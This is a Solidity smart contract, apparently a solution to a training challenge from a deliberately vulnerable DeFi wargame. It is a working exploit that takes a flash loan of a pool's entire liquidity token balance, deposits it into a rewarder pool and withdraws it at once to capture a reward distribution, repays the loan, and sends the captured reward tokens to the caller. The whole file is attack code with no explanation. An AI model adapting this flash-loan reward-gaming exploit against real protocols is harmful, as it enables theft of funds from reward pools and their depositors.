// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

interface ITheRewarderPool {
    function deposit(uint256 amount) external payable;
    function withdraw(uint256 amount) external;
}

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

contract RewardAttacker is ReentrancyGuard{
    IERC20 public immutable liquidityToken; // could be set in private, public for flexibility
    IERC20 public immutable rewardToken; // could be set in private, public for flexibility
    ITheRewarderPool private immutable theRewarderPool;
    IFlashLoanerPool private immutable flashLoanerPool;

    constructor(address theRewarderPoolAdd, address flashLoanerPoolAdd, IERC20 _liquidityToken, IERC20 _rewardToken) {
        theRewarderPool = ITheRewarderPool(theRewarderPoolAdd);
        flashLoanerPool = IFlashLoanerPool(flashLoanerPoolAdd);
        liquidityToken = IERC20(_liquidityToken);
        rewardToken = IERC20(_rewardToken);
    }

    function receiveFlashLoan(uint256 amount) public {
        theRewarderPool.deposit(amount);
        theRewarderPool.withdraw(amount);
        liquidityToken.transfer(address(flashLoanerPool), amount);
    }

    function attack() public{
        uint256 flashLoanPool = liquidityToken.balanceOf(address(flashLoanerPool));
        liquidityToken.approve(address(theRewarderPool), flashLoanPool);
        flashLoanerPool.flashLoan(flashLoanPool);
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }
}